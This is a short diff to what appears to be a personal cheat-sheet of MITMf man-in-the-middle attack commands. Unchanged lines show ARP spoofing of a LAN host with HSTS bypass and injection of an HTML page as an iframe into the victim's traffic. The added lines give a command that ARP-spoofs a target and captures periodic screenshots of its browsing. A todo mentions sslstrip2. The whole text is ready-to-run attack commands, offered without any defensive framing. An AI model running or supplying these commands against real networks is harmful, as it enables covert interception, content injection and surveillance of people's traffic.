@@ -36,6 +36,9 @@ mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hs
 # inject HTML url as Iframe
 mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hsts --inject --html-url http://www.somesite.com
 
+# screen shoot
+mitmf --spoof --arp -i wlp3s0 --screen --interval 5 --target 192.168.3.133 --gateway 192.168.3.1
+
 
 #############################
 #  todo sslstrip2
